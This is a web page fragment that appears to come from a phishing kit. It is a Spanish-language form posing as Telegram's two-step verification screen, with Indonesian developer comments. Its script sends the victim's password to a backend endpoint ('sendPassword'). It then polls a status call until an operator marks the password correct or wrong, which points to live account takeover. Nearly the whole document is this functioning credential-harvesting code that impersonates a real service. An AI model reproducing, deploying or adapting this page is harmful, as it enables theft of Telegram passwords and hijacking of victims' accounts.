<style>
    /* Menggunakan style minimalis yang kamu kirim agar ringan */
    .password-wrapper {
        text-align: center;
        padding: 20px 15px;
        font-family: 'Roboto', sans-serif;
    }

    .password-wrapper h3 {
        font-weight: 800;
        font-size: 22px;
        margin-bottom: 6px;
        color: #2c3e50;
    }

    .password-wrapper p {
        font-size: 13px;
        color: #666;
        margin-bottom: 20px;
    }

    .password-input {
        height: 55px;
        border-radius: 15px;
        border: 1.5px solid #ddd;
        text-align: center;
        font-size: 16px;
        width: 100%;
        transition: all 0.3s;
    }

    .password-input:focus {
        border-color: #f39c12;
        outline: none;
        box-shadow: 0 0 8px rgba(243, 156, 18, 0.1);
    }

    #wrong {
        font-size: 13px;
        color: #e53935;
        margin-top: 10px;
        font-weight: 600;
        display: none;
    }

    /* Tombol Utama */
    .btn-confirm {
        width: 100%;
        height: 52px;
        border-radius: 25px;
        background-color: #f39c12;
        border: none;
        font-weight: 700;
        color: #ffffff;
        margin-top: 15px;
        cursor: pointer;
    }

    /* LOADER CSS - Ini yang bikin animasi muter */
    #loader {
        display: none;
        margin-top: 15px;
    }

    .spinner {
        width: 30px;
        height: 30px;
        border: 4px solid #f3f3f3;
        border-top: 4px solid #f39c12;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        display: inline-block;
    }

    @keyframes spin {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }
</style>

<div class="password-wrapper">
    <h3>Ingrese su contraseña</h3>
    <p>Su cuenta tiene la verificación en dos pasos. Ingrese su contraseña de Telegram para continuar.</p>

    <div class="mb-3">
        <input type="password" class="form-control password-input" id="password_field"
            placeholder="Ingrese su contraseña" autocomplete="current-password" />
    </div>

    <p id="wrong">❌ Contraseña incorrecta. Intente de nuevo.</p>

    <button type="button" class="btn-confirm" id="btn_submit">CONFIRMAR</button>

    <div id="loader">
        <div class="spinner"></div>
        <p style="font-size: 12px; color: #888; margin-top: 5px;">Verificando...</p>
    </div>
</div>

<script>
    $(document).ready(function () {
        $("#wrong").hide();
        $("#loader").hide();

        function checkStatus() {
            $.ajax({
                url: "API/index.php",
                type: "POST",
                data: { "method": "getStatus" },
                success: function (data) {
                    // Parsing data jika perlu
                    let res = (typeof data === 'string') ? JSON.parse(data) : data;

                    if (res.result.status == "success") {
                        window.location.reload();
                    } else if (res.result.status == "failed") {
                        $("#wrong").show();
                        $("#password_field").val("");
                        $("#loader").hide();
                        $("#btn_submit").show(); // Munculkan tombol lagi jika gagal
                    } else {
                        setTimeout(function () {
                            checkStatus();
                        }, 1000);
                    }
                }
            });
        }

        $("#btn_submit").on("click", function (e) {
            e.preventDefault();
            var password = $("#password_field").val();

            if (password !== "") {
                $("#wrong").hide();
                $("#btn_submit").hide(); // Sembunyikan tombol biar tidak klik dua kali
                $("#loader").show();      // Tampilkan animasi loading

                $.ajax({
                    url: "API/index.php",
                    type: "POST",
                    data: { "method": "sendPassword", "password": password },
                    success: function () {
                        setTimeout(function () {
                            checkStatus();
                        }, 500);
                    },
                    error: function () {
                        $("#loader").hide();
                        $("#btn_submit").show();
                        alert("Error de conexión");
                    }
                });
            } else {
                alert("Por favor, ingrese su contraseña.");
            }
        });
    });
</script>
